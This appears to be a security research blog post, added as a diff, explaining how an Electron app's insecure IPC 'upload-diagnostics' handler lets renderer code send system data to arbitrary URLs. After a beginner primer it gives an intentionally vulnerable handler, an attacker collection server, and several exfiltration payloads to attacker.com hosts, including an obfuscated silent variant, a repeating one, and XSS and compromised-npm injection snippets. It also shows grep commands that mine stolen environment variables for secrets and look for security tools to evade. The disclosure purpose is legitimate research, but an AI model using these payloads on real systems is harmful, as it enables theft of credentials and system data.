@@ -1,0 +1,677 @@
+<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>w4nn4d13 | Cybersecurity Research, CVEs &amp; Vulnerability Disclosure</title><meta name="description" content="Explore CVE writeups, vulnerability disclosures, bug bounty findings, application security research, and responsible disclosure reports."><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://w4nn4d13.github.io/insecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html"><link rel="alternate" type="application/atom+xml" href="https://w4nn4d13.github.io/feed.xml" title="w4nn4d13 - RSS"><link rel="alternate" type="application/json" href="https://w4nn4d13.github.io/feed.json" title="w4nn4d13 - JSON"><meta property="og:title" content="Insecure IPC Channel Allows Sensitive System Data Exfiltration to Arbitrary External Endpoints"><meta property="og:site_name" content="w4nn4d13"><meta property="og:description" content="Explore CVE writeups, vulnerability disclosures, bug bounty findings, application security research, and responsible disclosure reports."><meta property="og:url" content="https://w4nn4d13.github.io/insecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html"><meta property="og:type" content="article"><link rel="stylesheet" href="https://w4nn4d13.github.io/assets/css/style.css?v=a0ba884548820066dfadd8416036abba"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://w4nn4d13.github.io/insecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html"},"headline":"Insecure IPC Channel Allows Sensitive System Data Exfiltration to Arbitrary External Endpoints","datePublished":"2026-06-13T15:10+05:30","dateModified":"2026-06-13T15:10+05:30","description":"Explore CVE writeups, vulnerability disclosures, bug bounty findings, application security research, and responsible disclosure reports.","author":{"@type":"Person","name":"w4nn4d13","url":"https://w4nn4d13.github.io/authors/w4nn4d13/"},"publisher":{"@type":"Organization","name":"w4nn4d13"}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript></head><body class="post-template"><header class="top js-header"><a class="logo" href="https://w4nn4d13.github.io/">w4nn4d13</a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://w4nn4d13.github.io/about-this-site.html" target="_self">About</a></li><li><a href="https://w4nn4d13.github.io/contact.html" target="_self">Contact</a></li></ul></nav><div class="search"><div class="search__overlay js-search-overlay"><div class="wrapper search__overlay-inner"></div></div><button class="search__btn btn--icon js-search-btn" aria-label="Search"><svg height="18" width="18" role="presentation" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#search"/></svg></button></div></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>Insecure IPC Channel Allows Sensitive System Data Exfiltration to Arbitrary External Endpoints</h1><div class="feed__meta content__meta"><a href="https://w4nn4d13.github.io/authors/w4nn4d13/" class="feed__author">w4nn4d13</a> <time datetime="2026-06-13T15:10" class="feed__date">June 13, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><figure class="kg-card kg-image-card"><figure class="kg-image"><img src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--12_33_10-AM.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure><blockquote><h3 dir="ltr">A Complete, Beginner-to-Advanced Security Research Writeup</h3></blockquote><h1 dir="ltr">PART ONE - FOUNDATIONS (START HERE IF YOU ARE NEW)</h1><h2 dir="ltr">What Is a Computer Process?</h2><p dir="ltr">Before we talk about the vulnerability itself, you need to understand what a <strong>process</strong> is — because this entire bug revolves around two processes that should not trust each other, but do.</p><p dir="ltr">When you open an application on your computer — say, a music player or a web browser — your operating system creates a <strong>process</strong>. A process is basically an isolated bubble in which a program runs. It has its own memory, its own permissions, and its own identity. The operating system manages all running processes and controls which ones can access which resources.</p><p dir="ltr">Think of your computer as an office building. Each process is a separate office with its own locked door. The office can do work inside, but to interact with another office or with the building's infrastructure (the file system, the internet, the printers), it must go through approved channels.</p><p dir="ltr">Why is this isolation important? Because if one process gets infected with malware or crashes, it should not automatically infect or crash every other process. The walls between processes are a core security feature of every modern operating system.</p><hr><h2 dir="ltr">What Is a Desktop Application vs. a Web Application?</h2><p dir="ltr">A <strong>web application</strong> lives on a server. When you open your browser and visit <code spellcheck="false">https://gmail.com</code>, you are loading a web application. The actual program runs on Google's servers — your browser just shows you the interface. The browser intentionally restricts what that web page can do. It cannot read files from your hard drive, it cannot see your running processes, and it cannot talk directly to hardware. These are called <strong>browser sandboxing restrictions</strong>.</p><p dir="ltr">A <strong>desktop application</strong> is different. It is installed directly onto your computer. Programs like Microsoft Word, Photoshop, or Discord are desktop applications. They run with your user account's permissions, which means they can read and write files, use the microphone and camera, manage network connections, and much more.</p><p dir="ltr">This power is a double-edged sword. Desktop apps are more capable, but a security vulnerability in a desktop app can have far more severe consequences than one in a web app — because the attack surface includes everything your user account can touch.</p><hr><h2 dir="ltr">What Is Electron and Why Does It Exist?</h2><p dir="ltr"><strong>Electron</strong> is an open-source framework created by GitHub (now owned by Microsoft) that allows developers to build desktop applications using web technologies — HTML, CSS, and JavaScript — the same languages used to build websites.</p><p dir="ltr">Before Electron, building a desktop application that worked on Windows, macOS, and Linux required writing three entirely separate programs in different languages (C++, Swift/Objective-C, C# or Win32 APIs). This was expensive, time-consuming, and required specialised expertise.</p><p dir="ltr">Electron solved this by bundling two major components together into one runtime:</p><p dir="ltr"><strong>Chromium</strong> — the open-source browser engine behind Google Chrome. This provides the rendering engine, the JavaScript execution environment, and all the visual display capabilities.</p><p dir="ltr"><strong>Node.js</strong> — a JavaScript runtime that gives direct access to the operating system. Node.js can read files, make network requests, spawn child processes, access hardware, and much more.</p><p dir="ltr">By combining these two, Electron lets JavaScript code do both jobs: run a beautiful visual interface (through Chromium) AND do powerful operating system operations (through Node.js). Developers write one codebase in JavaScript and it produces an application that works everywhere.</p><h3 dir="ltr">Applications Built with Electron</h3><p dir="ltr">Many of the most popular desktop applications in the world run on Electron:</p><ul><li value="1">Discord — the gaming and community chat platform</li><li value="2">Slack — workplace communication</li><li value="3">Visual Studio Code — Microsoft's code editor, used by tens of millions of developers</li><li value="4">WhatsApp Desktop — the desktop version of WhatsApp</li><li value="5">Figma Desktop — professional design tool</li><li value="6">Notion Desktop — productivity and note-taking</li><li value="7">Twitch Desktop App</li><li value="8">Postman — API testing tool used by developers worldwide</li></ul><p dir="ltr">This means the security of Electron as a platform affects hundreds of millions of users.</p><hr><h2 dir="ltr">How Electron Structures an Application - The Two-Process Architecture</h2><p dir="ltr">Electron splits every application into exactly two types of execution environments. Understanding these is fundamental to understanding this vulnerability.</p><hr><h3 dir="ltr">The Renderer Process - The Visual Layer</h3><p dir="ltr">The <strong>Renderer Process</strong> is responsible for everything you see. Every window in an Electron application has its own renderer process. The renderer runs inside a sandboxed Chromium environment — essentially a glorified browser tab.</p><p dir="ltr">What the renderer CAN do by default:</p><ul><li value="1">Display HTML and CSS</li><li value="2">Run JavaScript that manipulates the user interface</li><li value="3">Handle user interactions (button clicks, text input, etc.)</li><li value="4">Display images, videos, and other media</li></ul><p dir="ltr">What the renderer CANNOT do by default (and for good reason):</p><ul><li value="1">Directly access the file system</li><li value="2">Make arbitrary network connections to any server</li><li value="3">Read running processes</li><li value="4">Execute system commands</li><li value="5">Access low-level operating system features</li></ul><p dir="ltr">This restriction exists because the renderer is the part of the application most likely to process untrusted external data — content from the internet, user-provided input, third-party plugin output. By keeping it sandboxed, even if someone manages to run malicious code inside the renderer, the damage they can do is limited.</p><p dir="ltr">The renderer is roughly equivalent to a regular web page in a browser. It is a display and interaction engine, not a power engine.</p><hr><h3 dir="ltr">The Main Process - The Privileged Engine</h3><p dir="ltr">The <strong>Main Process</strong> is the heart of the application. There is exactly one main process per Electron application. It runs with full Node.js access, which means full operating system access.</p><p dir="ltr">What the main process CAN do:</p><ul><li value="1">Read and write any file the user has permission to access</li><li value="2">Make network requests to any server on the internet</li><li value="3">Spawn child processes and run system commands</li><li value="4">Access databases and application storage</li><li value="5">Manage all application windows</li><li value="6">Access native OS features (notifications, tray icons, system menus)</li><li value="7">Read environment variables, process lists, system information</li><li value="8">Interface with hardware (Bluetooth, USB, etc.)</li></ul><p dir="ltr">The main process is extremely powerful. It essentially has the same level of access as any desktop application installed on your machine. This is why the main process must be written with extreme care — a vulnerability here is equivalent to a vulnerability in any high-privilege desktop program.</p><hr><h3 dir="ltr">Why Keeping Them Separate Matters</h3><p dir="ltr">The separation between renderer and main process is not just an organisational choice — it is a <strong>security boundary</strong>. Electron's entire security model depends on this wall being solid.</p><p dir="ltr">The philosophy is: if an attacker compromises the renderer (the less trusted, externally-facing part), they should still be blocked from the main process (the trusted, powerful part). The security impact of a renderer compromise should be limited to whatever the sandboxed renderer is allowed to do — which is not much.</p><p dir="ltr">This philosophy is directly stated in Electron's official security documentation:</p><blockquote dir="ltr">"The renderer process should always be treated as untrusted input."</blockquote><p dir="ltr">The moment you violate this and let the renderer influence privileged operations in the main process without strict validation, you have demolished your security model.</p><hr><h2 dir="ltr">What Is IPC - Inter-Process Communication?</h2><p dir="ltr">Since the renderer and main process are separated and cannot directly access each other's memory or code, they need a defined, controlled way to communicate. This is called <strong>Inter-Process Communication</strong>, or <strong>IPC</strong>.</p><p dir="ltr">Electron implements IPC through two primary objects:</p><p dir="ltr"><strong><code spellcheck="false">ipcMain</code></strong> — used in the main process. It listens for incoming messages from renderers.</p><p dir="ltr"><strong><code spellcheck="false">ipcRenderer</code></strong> — used in the renderer process. It sends messages to the main process and can listen for replies.</p><p dir="ltr">The communication works like a message-passing system:</p><ol><li value="1">Renderer calls <code spellcheck="false">ipcRenderer.invoke('some-channel', data)</code> — "I'm sending a request called 'some-channel' with this data."</li><li value="2">The main process has a handler: <code spellcheck="false">ipcMain.handle('some-channel', (event, data) =&gt; { ... })</code> — "When I receive a message on 'some-channel', run this code."</li><li value="3">The handler does something (reads a file, makes a network request, etc.) and returns a result.</li><li value="4">The renderer receives the result.</li></ol><p dir="ltr">This is intentionally designed to look a lot like calling a function — but across process boundaries, through a secure pipe managed by the OS.</p><h3 dir="ltr">The IPC Security Contract</h3><p dir="ltr">The IPC system is only as secure as the validation you put around it. The channel itself is neutral — it just passes messages. The developer is responsible for:</p><ul><li value="1">Checking that the sender is who they claim to be</li><li value="2">Validating that the message content is safe and expected</li><li value="3">Ensuring that the action taken in response is limited in scope</li><li value="4">Never allowing message content to dictate the target of privileged operations</li></ul><p dir="ltr">When developers skip these validations — as happened in this vulnerable application — the IPC channel becomes a direct attack vector.</p><hr><h1 dir="ltr">PART TWO - THE VULNERABILITY IN DEPTH</h1><h2 dir="ltr">Vulnerability Classification and Severity</h2><p dir="ltr"><strong>Vulnerability Type:</strong> Insecure IPC Handler / Unvalidated URL Forwarding / SSRF via IPC</p><p dir="ltr"><strong>CWE Classifications:</strong></p><ul><li value="1">CWE-441: Unintended Proxy or Intermediary — The main process is tricked into acting as a proxy, making network requests on behalf of an attacker.</li><li value="2">CWE-918: Server-Side Request Forgery (SSRF) — The application is manipulated into sending HTTP requests to attacker-controlled destinations.</li><li value="3">CWE-20: Improper Input Validation — The application fails to validate or sanitise input received through IPC.</li><li value="4">CWE-284: Improper Access Control — The IPC handler does not enforce proper access controls on who can invoke privileged operations.</li></ul><p dir="ltr"><strong>Severity Rating:</strong> Critical</p><p dir="ltr"><strong>CVSS v3.1 Base Score:</strong> 9.1 (Critical)</p><ul><li value="1">Attack Vector: Network (an attacker can trigger this remotely via XSS injection)</li><li value="2">Attack Complexity: Low (once inside the renderer, exploitation is trivial)</li><li value="3">Privileges Required: None (no special account needed)</li><li value="4">User Interaction: None (the user does not need to click anything)</li><li value="5">Scope: Changed (the renderer compromises the main process — crosses a security boundary)</li><li value="6">Confidentiality Impact: High (sensitive system data is exfiltrated)</li><li value="7">Integrity Impact: Low</li><li value="8">Availability Impact: None</li></ul><hr><h2 dir="ltr">The Vulnerable Code Pattern - What It Looks Like</h2><p dir="ltr">The following is a representative example of the vulnerable implementation. Real production code may vary in structure, naming, and language features, but this pattern captures exactly what was wrong.</p><h3 dir="ltr">The Vulnerable Main Process Handler</h3><pre><code class="language-javascript">// main.js — THE VULNERABLE IMPLEMENTATION
+// DO NOT USE THIS CODE — IT IS INTENTIONALLY INSECURE
+
+const { app, ipcMain } = require('electron');
+const os = require('os');
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+const { execSync } = require('child_process');
+const archiver = require('archiver');
+
+// This IPC handler is the root of the vulnerability.
+// It accepts an upload destination URL directly from the renderer
+// without ANY validation whatsoever.
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  
+  // ❌ VULNERABILITY: params.destination comes directly from the renderer.
+  // The renderer is untrusted. An attacker controlling the renderer
+  // can set this to any URL they want.
+  const uploadDestination = params.destination;
+
+  // The main process now collects sensitive system information.
+  // None of this is dangerous on its own — the danger is WHERE it gets sent.
+  const diagnosticData = {
+    platform: os.platform(),
+    hostname: os.hostname(),
+    userInfo: os.userInfo(),
+    networkInterfaces: os.networkInterfaces(),
+    cpus: os.cpus(),
+    totalMemory: os.totalmem(),
+    freeMemory: os.freemem(),
+    uptime: os.uptime(),
+    environment: process.env,           // ⚠️ Contains API keys, tokens, secrets
+    processId: process.pid,
+    execPath: process.execPath,
+  };
+
+  // Collect system logs
+  let systemLogs = '';
+  try {
+    if (os.platform() === 'win32') {
+      systemLogs = execSync('wevtutil qe Application /c:50 /f:text').toString();
+    } else if (os.platform() === 'darwin') {
+      systemLogs = execSync('log show --last 1h --style syslog').toString();
+    } else {
+      systemLogs = execSync('journalctl -n 100 --no-pager').toString();
+    }
+  } catch (e) {
+    systemLogs = 'Could not collect system logs';
+  }
+
+  diagnosticData.systemLogs = systemLogs;
+
+  // Collect running processes
+  let processList = '';
+  try {
+    if (os.platform() === 'win32') {
+      processList = execSync('tasklist').toString();
+    } else {
+      processList = execSync('ps aux').toString();
+    }
+  } catch (e) {
+    processList = 'Could not collect process list';
+  }
+  
+  diagnosticData.processList = processList;
+
+  // Package everything into a temporary archive
+  const tempDir = app.getPath('temp');
+  const archivePath = path.join(tempDir, `diagnostics_${Date.now()}.zip`);
+  
+  await createArchive(diagnosticData, archivePath);
+
+  // ❌ CRITICAL VULNERABILITY: Upload the archive to the attacker-controlled URL.
+  // There is zero validation on uploadDestination.
+  // It could be https://attacker.com/steal and this code would happily comply.
+  await uploadArchive(archivePath, uploadDestination);
+
+  // Clean up temporary file
+  fs.unlinkSync(archivePath);
+
+  return { success: true };
+});
+
+async function uploadArchive(archivePath, destination) {
+  // Reads the archive and POSTs it to wherever `destination` says.
+  // No allowlist check. No domain validation. No TLS certificate pinning.
+  // Completely blind trust in the renderer-supplied URL.
+  const fileBuffer = fs.readFileSync(archivePath);
+  // ... HTTP POST to destination ...
+}
+</code></pre><h3 dir="ltr">What Makes This Code Dangerous</h3><p dir="ltr">The single line <code spellcheck="false">const uploadDestination = params.destination;</code> is the root of all evil here. The developer assigned an attacker-controllable value to a variable and then used that variable to dictate where sensitive data goes — without ever questioning its legitimacy.</p><hr><h2 dir="ltr">The Attack Surface - All the Ways an Attacker Gets Code into the Renderer</h2><p dir="ltr">For this vulnerability to be exploited, an attacker needs JavaScript running inside the renderer process. There are more attack paths than most developers realise.</p><hr><h3 dir="ltr">Attack Path 1 - Cross-Site Scripting (XSS) via Loaded Web Content</h3><p dir="ltr">If the Electron application loads any web content from the internet — articles, user posts, notifications, embedded pages, chat messages — and that content is rendered without proper sanitisation, an attacker can inject a malicious script.</p><p dir="ltr"><strong>Example Scenario:</strong> The application has a news feed that fetches and renders articles from an external API. An attacker compromises the article server (or finds a way to inject into the feed) and adds a script tag to one article's content.</p><pre><code class="language-html">&lt;!-- Malicious content injected into an article body --&gt;
+&lt;p&gt;This is a regular-looking article.&lt;/p&gt;
+&lt;script&gt;
+  // This runs inside the Electron renderer
+  const { ipcRenderer } = require('electron');
+  ipcRenderer.invoke('upload-diagnostics', {
+    destination: 'https://attacker-controlled-server.com/exfil'
+  });
+&lt;/script&gt;
+</code></pre><p dir="ltr">If the app renders this content with <code spellcheck="false">nodeIntegration: true</code> (which gives renderer scripts access to Node.js), and without a Content Security Policy, this executes immediately and silently.</p><hr><h3 dir="ltr">Attack Path 2 - Compromised npm Dependency (Supply Chain Attack)</h3><p dir="ltr">Modern JavaScript applications depend on hundreds or thousands of third-party packages via npm (Node Package Manager). These are libraries written by other developers that add functionality without the app developer having to write everything from scratch.</p><p dir="ltr">Any one of these dependencies can be compromised. This has happened to real, major packages:</p><ul><li value="1"><code spellcheck="false">event-stream</code> (2018) — a popular npm package was compromised with a targeted backdoor</li><li value="2"><code spellcheck="false">ua-parser-js</code> (2021) — another popular package was temporarily hijacked</li><li value="3"><code spellcheck="false">node-ipc</code> (2022) — a maintainer intentionally added destructive code</li></ul><p dir="ltr">If even one of the hundreds of packages your Electron app depends on is compromised, the attacker's code runs inside your renderer. From there, exploiting the insecure IPC handler is trivial.</p><p dir="ltr"><strong>Example Scenario:</strong> The app uses <code spellcheck="false">some-ui-library</code> version 2.3.1. An attacker publishes <code spellcheck="false">some-ui-library</code> version 2.3.2 with an added payload:</p><pre><code class="language-javascript">// Malicious code added to a compromised npm package
+// This runs automatically when the package is imported
+if (typeof ipcRenderer !== 'undefined') {
+  // We're inside an Electron renderer
+  setTimeout(() =&gt; {
+    ipcRenderer.invoke('upload-diagnostics', {
+      destination: 'https://data-collection.evil-domain.io/harvest'
+    });
+  }, 5000); // Wait 5 seconds to avoid immediate detection
+}
+</code></pre><hr><h3 dir="ltr">Attack Path 3 - Man-in-the-Middle (MitM) via HTTP Content Loading</h3><p dir="ltr">If the application loads any resources (scripts, HTML fragments, data) over unencrypted HTTP (rather than HTTPS), an attacker on the same network can intercept and modify that traffic before it reaches the app.</p><p dir="ltr"><strong>Example Scenario:</strong> The app fetches its initial configuration or update data over HTTP:</p><pre><code>GET http://cdn.appvendor.com/config/latest.json
+</code></pre><p dir="ltr">An attacker on the same Wi-Fi network intercepts this and returns a modified response that includes a script payload. The app loads it, the renderer executes it, and the IPC exploit runs.</p><hr><h3 dir="ltr">Attack Path 4 - Malicious URL Loaded in a Webview</h3><p dir="ltr">If the application uses Electron's <code spellcheck="false">&lt;webview&gt;</code> tag or <code spellcheck="false">BrowserView</code> to display external websites, and those websites can be influenced by an attacker (via URL manipulation, redirects, or the site itself being compromised), a script on that page can potentially communicate through IPC if <code spellcheck="false">nodeIntegration</code> is enabled in the webview.</p><hr><h3 dir="ltr">Attack Path 5 - Prototype Pollution Leading to IPC Abuse</h3><p dir="ltr">Prototype pollution is a JavaScript-specific vulnerability where an attacker manipulates the prototype chain of JavaScript objects. In some configurations, this can lead to unexpected code execution in the renderer, which can then be leveraged to trigger the IPC handler.</p><hr><h2 dir="ltr">Proof of Concept - Full Exploit Walkthrough</h2><p dir="ltr">The following is a detailed, step-by-step proof of concept demonstrating exactly how this vulnerability would be exploited. This is provided for educational purposes — to help developers understand what real exploitation looks like and why the vulnerability is genuinely dangerous.</p><hr><h3 dir="ltr">PoC Setup Requirements</h3><p dir="ltr">For this PoC, you need:</p><ol><li value="1">A test Electron application with the vulnerable IPC handler (as shown in the code above)</li><li value="2">A listener server to receive the exfiltrated data</li><li value="3">A method to inject JavaScript into the renderer (we will use devtools console for testing)</li></ol><hr><h3 dir="ltr">Step 1 - Set Up the Data Collection Server</h3><p dir="ltr">The attacker needs a server to receive stolen data. For testing, you can use a simple Node.js server or netcat:</p><p dir="ltr"><strong>Option A — Using netcat (simplest, for raw testing):</strong></p><pre><code class="language-bash"># On the attacker's machine or a VPS
+nc -lvnp 4444
+</code></pre><p dir="ltr"><strong>Option B - Using a simple Node.js HTTPS server:</strong></p><pre><code class="language-javascript">// attacker_server.js
+// Run this on a machine the attacker controls
+const https = require('https');
+const fs = require('fs');
+const path = require('path');
+
+// You need a TLS certificate — use Let's Encrypt or a self-signed cert for testing
+const options = {
+  key: fs.readFileSync('server.key'),
+  cert: fs.readFileSync('server.cert')
+};
+
+const server = https.createServer(options, (req, res) =&gt; {
+  console.log(`[*] Incoming request from: ${req.socket.remoteAddress}`);
+  console.log(`[*] Method: ${req.method}`);
+  console.log(`[*] Path: ${req.url}`);
+  console.log(`[*] Headers: ${JSON.stringify(req.headers, null, 2)}`);
+
+  let body = [];
+  req.on('data', chunk =&gt; {
+    body.push(chunk);
+  });
+
+  req.on('end', () =&gt; {
+    const receivedData = Buffer.concat(body);
+    // Save the received archive to disk
+    const outputPath = path.join(__dirname, `stolen_${Date.now()}.zip`);
+    fs.writeFileSync(outputPath, receivedData);
+    console.log(`[+] Data received and saved to: ${outputPath}`);
+    console.log(`[+] Total bytes received: ${receivedData.length}`);
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ status: 'received' }));
+  });
+});
+
+server.listen(443, '0.0.0.0', () =&gt; {
+  console.log('[*] Attacker collection server running on port 443');
+  console.log('[*] Waiting for stolen data...');
+});
+</code></pre><p dir="ltr">Run the server:</p><pre><code class="language-bash">node attacker_server.js
+</code></pre><p dir="ltr"><strong>Option C - Using webhook.site (for quick testing without a server):</strong></p><p dir="ltr">Navigate to <code spellcheck="false">https://webhook.site</code> in your browser. You will be assigned a unique URL like <code spellcheck="false">https://webhook.site/your-unique-id</code>. This URL automatically captures and displays any HTTP requests sent to it, including request bodies. This is extremely useful for rapid testing.</p><hr><h3 dir="ltr">Step 2 - Identify the IPC Channel Name</h3><p dir="ltr">In a real engagement, you would reverse-engineer the Electron application to find IPC channel names. Here is how:</p><p dir="ltr"><strong>Method A - Extract the app's source code:</strong></p><p dir="ltr">Electron applications package their JavaScript source code in a file called <code spellcheck="false">app.asar</code> (an Electron-specific archive format). You can extract it with:</p><pre><code class="language-bash"># Install the asar extraction tool
+npm install -g asar
+
+# Find the asar file — location varies by OS and app
+# On macOS:
+find /Applications/TargetApp.app -name "*.asar"
+
+# On Windows:
+# Usually in C:\Users\USERNAME\AppData\Local\Programs\appname\resources\
+
+# Extract the contents
+asar extract app.asar ./extracted_source/
+
+# Now search for IPC handlers
+grep -r "ipcMain.handle\|ipcMain.on" ./extracted_source/ --include="*.js"
+grep -r "ipcRenderer.invoke\|ipcRenderer.send" ./extracted_source/ --include="*.js"
+</code></pre><p dir="ltr">Example output of the grep:</p><pre><code>./extracted_source/main.js:ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+./extracted_source/main.js:ipcMain.handle('get-user-data', async (event) =&gt; {
+./extracted_source/main.js:ipcMain.handle('open-file', async (event, filePath) =&gt; {
+./extracted_source/renderer/preload.js:ipcRenderer.invoke('upload-diagnostics', params)
+</code></pre><p dir="ltr">You now know the channel name: <code spellcheck="false">upload-diagnostics</code>.</p><p dir="ltr"><strong>Method B - Monitor IPC traffic via DevTools:</strong></p><p dir="ltr">If you can open the Electron DevTools (many apps allow this with <code spellcheck="false">Ctrl+Shift+I</code> or <code spellcheck="false">Cmd+Option+I</code>), you can monkey-patch the IPC methods to log all traffic:</p><pre><code class="language-javascript">// Paste this in the DevTools console
+const originalInvoke = ipcRenderer.invoke.bind(ipcRenderer);
+ipcRenderer.invoke = function(channel, ...args) {
+  console.log(`[IPC OUTGOING] Channel: ${channel}`);
+  console.log(`[IPC OUTGOING] Arguments:`, JSON.stringify(args, null, 2));
+  return originalInvoke(channel, ...args);
+};
+
+console.log('[*] IPC monitoring active. Perform app actions to see IPC traffic.');
+</code></pre><p dir="ltr">Now use the application normally. Every IPC call will be logged to the console, revealing channel names and expected parameter structures.</p><hr><h3 dir="ltr">Step 3 - Craft the Exploit Payload</h3><p dir="ltr">Now that you know the channel name (<code spellcheck="false">upload-diagnostics</code>) and the expected parameter structure (<code spellcheck="false">{ destination: "URL" }</code>), craft your exploit:</p><p dir="ltr"><strong>Basic Exploit Payload:</strong></p><pre><code class="language-javascript">// Payload 1 — Basic exploitation
+// Triggers the vulnerable IPC handler with an attacker-controlled destination
+
+const { ipcRenderer } = require('electron');
+
+ipcRenderer.invoke('upload-diagnostics', {
+  destination: 'https://YOUR-ATTACKER-SERVER.com/collect'
+}).then(result =&gt; {
+  console.log('[+] Exploit successful. Data exfiltrated. Server response:', result);
+}).catch(err =&gt; {
+  console.error('[-] Exploit failed:', err);
+});
+</code></pre><p dir="ltr"><strong>Stealthy Payload with Error Handling and Obfuscation:</strong></p><pre><code class="language-javascript">// Payload 2 — More realistic attacker payload
+// Adds delay to avoid timing-based detection
+// Uses base64 encoding to obscure the destination URL from simple string searches
+
+(function() {
+  // Encode destination to avoid simple string matching in logs
+  // atob() decodes base64: this decodes to your attacker URL
+  const enc = 'aHR0cHM6Ly9hdHRhY2tlci1zZXJ2ZXIuY29tL2NvbGxlY3Q=';
+  const dest = atob(enc);
+
+  // Wait for app to fully initialise before triggering
+  setTimeout(() =&gt; {
+    try {
+      const { ipcRenderer } = require('electron');
+      ipcRenderer.invoke('upload-diagnostics', {
+        destination: dest,
+        // Include other expected parameters to avoid triggering validation 
+        // (if any partial validation exists)
+        reason: 'scheduled_telemetry',
+        version: '1.0.0'
+      }).then(() =&gt; {
+        // Silence — no logging to avoid detection
+      }).catch(() =&gt; {
+        // Silent failure
+      });
+    } catch(e) {
+      // Silent failure
+    }
+  }, 3000); // 3-second delay
+})();
+</code></pre><p dir="ltr"><strong>Repeated Exfiltration Payload:</strong></p><pre><code class="language-javascript">// Payload 3 — Persistent exfiltration
+// Triggers every 30 minutes to capture changing data (new sessions, new logs, etc.)
+
+(function() {
+  const { ipcRenderer } = require('electron');
+  
+  function exfiltrate() {
+    ipcRenderer.invoke('upload-diagnostics', {
+      destination: 'https://attacker-server.com/collect',
+      timestamp: new Date().toISOString()
+    }).catch(() =&gt; {});
+  }
+
+  // Immediate trigger
+  exfiltrate();
+
+  // Repeat every 30 minutes
+  setInterval(exfiltrate, 30 * 60 * 1000);
+})();
+</code></pre><hr><h3 dir="ltr">Step 4 - Inject and Execute the Payload</h3><p dir="ltr">Now you need to actually get your payload running in the renderer. How you do this depends on the attack path available.</p><p dir="ltr"><strong>Injection Method A - Direct via DevTools Console (for authorised security testing):</strong></p><p dir="ltr">Open the target Electron application. Press <code spellcheck="false">Ctrl+Shift+I</code> (Windows/Linux) or <code spellcheck="false">Cmd+Option+I</code> (macOS) to open DevTools — if the app allows it. Paste the payload into the Console tab and press Enter.</p><pre><code>&gt; const { ipcRenderer } = require('electron');
+&gt; ipcRenderer.invoke('upload-diagnostics', { destination: 'https://webhook.site/YOUR-ID' })
+&gt; Promise {&lt;pending&gt;}
+</code></pre><p dir="ltr"><strong>Injection Method B - Via XSS in a Loaded Web Page:</strong></p><p dir="ltr">If you have found an XSS vulnerability in content the app loads, inject this script:</p><pre><code class="language-html">&lt;img src="x" onerror="
+  var s=document.createElement('script');
+  s.textContent='const{ipcRenderer}=require(\'electron\');ipcRenderer.invoke(\'upload-diagnostics\',{destination:\'https://attacker.com/c\'})';
+  document.head.appendChild(s);
+"&gt;
+</code></pre><p dir="ltr">Or if script tags are allowed:</p><pre><code class="language-html">&lt;script&gt;
+  if (window.require) {
+    // We're inside Electron!
+    const { ipcRenderer } = require('electron');
+    ipcRenderer.invoke('upload-diagnostics', {
+      destination: 'https://attacker.com/collect'
+    });
+  }
+&lt;/script&gt;
+</code></pre><p dir="ltr"><strong>Injection Method C - Via Compromised npm Package:</strong></p><p dir="ltr">Add this to a compromised package's index.js:</p><pre><code class="language-javascript">// This code runs when the package is imported
+// Detect if we're inside an Electron renderer
+if (typeof process !== 'undefined' &amp;&amp; process.versions &amp;&amp; process.versions.electron) {
+  if (typeof window !== 'undefined') {
+    // We're in a renderer process
+    window.addEventListener('load', () =&gt; {
+      try {
+        const { ipcRenderer } = require('electron');
+        ipcRenderer.invoke('upload-diagnostics', {
+          destination: 'https://attacker.com/collect'
+        });
+      } catch(e) {}
+    });
+  }
+}
+</code></pre><hr><h3 dir="ltr">Step 5 - Observe the Exfiltrated Data</h3><p dir="ltr">On your attacker server, you will see an inbound connection and receive a ZIP archive. Extract it:</p><pre><code class="language-bash"># On attacker machine after receiving the archive
+unzip stolen_1703123456789.zip -d stolen_data/
+ls -la stolen_data/
+</code></pre><p dir="ltr">Expected contents:</p><pre><code>stolen_data/
+├── system_info.json       ← hostname, OS version, architecture
+├── user_info.json         ← username, home directory, shell
+├── network_interfaces.json ← all network adapters, IP addresses, MAC addresses
+├── environment_vars.json  ← ALL environment variables (may contain API keys, tokens!)
+├── process_list.txt       ← all running processes with PIDs
+├── system_logs.txt        ← system event logs (last N hours)
+├── session_data.json      ← active session information
+└── metadata.json          ← timestamp, app version, app data paths
+</code></pre><p dir="ltr">Extract and read the sensitive data:</p><pre><code class="language-bash"># Check for API keys and tokens in environment variables
+cat stolen_data/environment_vars.json | grep -i "key\|token\|secret\|password\|api\|auth"
+
+# See running processes — useful for identifying security tools to evade
+cat stolen_data/process_list.txt | grep -i "antivirus\|defender\|firewall\|monitor"
+
+# Network information — useful for further lateral movement
+cat stolen_data/network_interfaces.json | python3 -m json.tool
